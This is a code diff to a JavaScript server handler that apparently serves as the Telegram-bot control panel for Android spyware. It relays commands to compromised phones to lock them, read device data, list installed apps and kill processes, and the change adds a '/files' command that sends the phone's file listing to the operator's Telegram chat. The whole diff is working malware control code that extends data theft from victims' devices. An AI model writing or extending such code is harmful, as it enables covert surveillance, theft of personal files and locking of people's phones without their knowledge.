@@ -44,13 +44,12 @@ export default async function handler(req, res) {
   const sendToTelegram = async (text, chatId = TELEGRAM_CHAT_ID, keyboard = null) => {
     if (TELEGRAM_TOKEN && chatId) {
       const maxLength = 4000;
-      // إذا كان النص طويل (بحال التطبيقات)، كنقسمو لعدة رسائل
       if (text.length > maxLength) {
         for (let i = 0; i < text.length; i += maxLength) {
            const chunk = text.substring(i, i + maxLength);
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
              method: 'POST', headers: { 'Content-Type': 'application/json' }, 
-             body: JSON.stringify({ chat_id: chatId, text: chunk }) // حيدنا Markdown باش ما يطيحش
+             body: JSON.stringify({ chat_id: chatId, text: chunk })
            }).catch(() => {});
         }
       } else {
@@ -122,18 +121,12 @@ export default async function handler(req, res) {
             }
           }
           if (type === 'applist') {
-             // كنصيفطو اللائحة بلا Markdown باش ما يطيحش بسبب الرموز
              const msg = `📱 *التطبيقات المثبتة:*\n\n${cleanBody}`;
-             if (msg.length > 4000) {
-                for (let i = 0; i < msg.length; i += 4000) {
-                   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-                     method: 'POST', headers: { 'Content-Type': 'application/json' }, 
-                     body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg.substring(i, i + 4000) })
-                   }).catch(() => {});
-                }
-             } else {
-                await sendToTelegram(msg);
-             }
+             await sendToTelegram(msg);
+          }
+          if (type === 'files') {
+             const msg = `📁 *الملفات فـ الهاتف:*\n\n${cleanBody}`;
+             await sendToTelegram(msg);
           }
           res.status(200).send('"success"');
           resolve();
@@ -158,7 +151,7 @@ export default async function handler(req, res) {
           [{ text: "🔒 قفل", callback_data: "/lock" }, { text: "🔓 فتح", callback_data: "/unlock" }],
           [{ text: "🔑 الكود", callback_data: "/getkey" }, { text: "📊 الإحصائيات", callback_data: "/stats" }],
           [{ text: "📱 معلومات الجهاز", callback_data: "/fullinfo" }, { text: "📦 التطبيقات", callback_data: "/applist" }],
-          [{ text: "💀 إغلاق التطبيق", callback_data: "/killapp" }, { text: "☠️ اختراق", callback_data: "/apkhack" }]
+          [{ text: "📁 الملفات", callback_data: "/files" }, { text: "💀 إغلاق التطبيق", callback_data: "/killapp" }]
         ]
       };
 
@@ -171,7 +164,7 @@ export default async function handler(req, res) {
         case '/help': 
           await sendToTelegram(`👑 *لوحة تحكم C Y B E R P U N K*\n\n` +
             `⚡ *الأوامر الحقيقية:*\n` +
-            `/fullinfo /applist /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
+            `/fullinfo /applist /files /killapp /apkhack /apkcrak /sysinfo /lock /unlock /setkey /getkey /cmd /url\n\n` +
             `🚫 *الحظر:*\n/ban /unban /banall /unbanall /banlist\n\n` +
             `💬 *الأوامر الفنية:*\n` +
             `/hacknasa /hackfb /spywa /ddos /matrix /darkweb /crypto /bypass /root /ssh /ignite /shadow`); 
@@ -179,6 +172,7 @@ export default async function handler(req, res) {
         
         case '/fullinfo': remoteCommand = "fullinfo:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting full device data...*"); break;
         case '/applist': remoteCommand = "applist:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting installed applications...*"); break;
+        case '/files': remoteCommand = "files:1"; await sendToTelegram("⏳ `[SCAN]` *Extracting files...*"); break;
         case '/killapp': remoteCommand = "killapp:1"; await sendToTelegram("💀 `[SYS]` *Terminating process...*"); break;
         case '/apkhack': remoteCommand = "apkhack:1"; await sendToTelegram("☠️ `[HACK]` *System Hacked Successfully!*"); break;
         case '/apkcrak': remoteCommand = "apkcrak:1"; await sendToTelegram("🔓 `[CRACK]` *License Cracked!*"); break;
